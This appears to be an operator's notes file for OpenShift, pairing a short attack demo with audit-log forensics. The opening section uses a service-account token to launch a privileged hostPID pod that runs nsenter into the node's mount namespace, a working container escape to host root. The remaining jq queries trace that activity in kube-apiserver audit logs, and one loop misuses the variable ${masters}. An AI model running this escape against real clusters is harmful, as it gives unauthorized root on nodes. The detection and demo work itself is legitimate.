Logs https://docs.openshift.com/container-platform/4.13/security/audit-log-view.html

## Exploit VISA - get token - create a namespace and run  r00t container

oc --token $(cat token) create namespace my-newns
oc --token $(cat token) -n my-newns create deployment mastercard-v2 --image alpine --port=8080 -- sleep 50000

oc --token $(cat token) run -n my-newns r00t --restart=Never --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'

oc --token $(cat token) -n my-newns rsh r00t

oc --token $(cat token) -n my-newns delete pod r00t

=======
oc adm node-logs master-0 --path=kube-apiserver/audit.log > audit.log

## get all actions on my-newns namespace
jq -r 'select(.requestURI | contains("/api/v1/namespaces/my-newns")) | select(.user.username != "system:apiserver") | [.requestReceivedTimestamp, .user.username, .verb, .objectRef.namespace, .objectRef.resource, .objectRef.subresource, .objectRef.name, .userAgent, .responseStatus.code, .annotations."authorization.k8s.io/decision", .annotations."authorization.k8s.io/reason"] | @csv' audit.log

## Get everything that the system:serviceaccount:payments:visa-processor has beeing done to the cluster
jq -r 'select(.user.username =="system:serviceaccount:payments:visa-processor") | [.requestReceivedTimestamp, .user.username, .verb, .objectRef.namespace, .objectRef.resource, .objectRef.subresource, .objectRef.name, .userAgent, .responseStatus.code, .annotations."authorization.k8s.io/decision", .annotations."authorization.k8s.io/reason"] | @csv' audit.log

=======

## Get the list of masters
masters=$(oc get nodes -l node-role.kubernetes.io/master -o custom-columns=POD:.metadata.name --no-headers)

## get all actions on payments namespace
echo '"Timestamp","Username","Verb","Namespace","Resource","Name","UserAgent","Authorization Decision","Authorization Reason"' > report.csv
for master in $(echo $masters)
do
  oc adm node-logs  ${masters} --path=kube-apiserver/audit.log | jq -r 'select(.requestURI | contains("/api/v1/namespaces/payments")) | select(.user.username != "system:apiserver") | [.requestReceivedTimestamp, .user.username, .verb, .objectRef.namespace, .objectRef.resource, .objectRef.name, .userAgent, .responseStatus.code, .annotations."authorization.k8s.io/decision", .annotations."authorization.k8s.io/reason"] | @csv' >> report.csv
done

## Get everything that the system:serviceaccount:payments:visa-processor has beeing done to the cluster
echo '"Timestamp","Username","Verb","Namespace","Resource","Name","UserAgent","Authorization Decision","Authorization Reason"' > report.csv
for master in $(echo $masters)
do
  oc adm node-logs  ${master} --path=kube-apiserver/audit.log | jq -r 'select(.user.username =="system:serviceaccount:payments:visa-processor") | [.requestReceivedTimestamp, .user.username, .verb, .objectRef.namespace, .objectRef.resource, .objectRef.name, .userAgent, .responseStatus.code, .annotations."authorization.k8s.io/decision", .annotations."authorization.k8s.io/reason"] | @csv' >> report.csv
done

## Get all the info for the pod r00t
echo '"Timestamp","Username","Verb","Namespace","Resource","Name","UserAgent","Authorization Decision","Authorization Reason"' > report.csv
for master in $(echo $masters)
do
  oc adm node-logs  ${master} --path=kube-apiserver/audit.log | jq -r 'select(.objectRef.name == "r00t") | [.requestReceivedTimestamp, .user.username, .verb, .objectRef.namespace, .objectRef.resource, .objectRef.name, .userAgent, .responseStatus.code, .annotations."authorization.k8s.io/decision", .annotations."authorization.k8s.io/reason"] | @csv' >> report.csv
done

## pods created in the payment namespaces
for master in $(echo $masters)
do
oc adm node-logs  ${master} --path=kube-apiserver/audit.log  | jq -r 'select(.objectRef.resource == "pods" and .verb == "create" and .objectRef.namespace == "payments" and (.user.groups | index("system:serviceaccounts:kube-system") | not) and .user.username != "system:kube-scheduler") | [.requestReceivedTimestamp, .user.username, .verb, .objectRef.namespace, .objectRef.name] | @csv'
done

## deployments created in the payment namespaces
for master in $(echo $masters)
do
oc adm node-logs  ${master} --path=kube-apiserver/audit.log  | jq -r 'select(.objectRef.resource == "deployments" and .verb == "create" and .objectRef.namespace == "payments") | [.requestReceivedTimestamp, .user.username, .verb, .objectRef.namespace, .objectRef.name] | @csv'
done

# Get the secureContext of all pods running or runned on payment namespaces
for master in $(echo $masters)
do
oc adm node-logs  ${master} --path=kube-apiserver/audit.log  | jq -r 'select(.objectRef.resource == "pods" and .objectRef.namespace == "payments" and (.objectRef.name | length > 0) and (.annotations."securitycontextconstraints.admission.openshift.io/chosen" | length > 0)) | [.requestReceivedTimestamp, .user.username, .objectRef.namespace, .objectRef.name, .annotations."securitycontextconstraints.admission.openshift.io/chosen"] | @csv'
done

## Identify exec into a pod
for master in $(echo $masters)
do
oc adm node-logs  ${master} --path=kube-apiserver/audit.log | jq -r 'select(.objectRef.subresource == "exec") | [.requestReceivedTimestamp, .user.username, .objectRef.namespace, .objectRef.name ] | @csv'
done
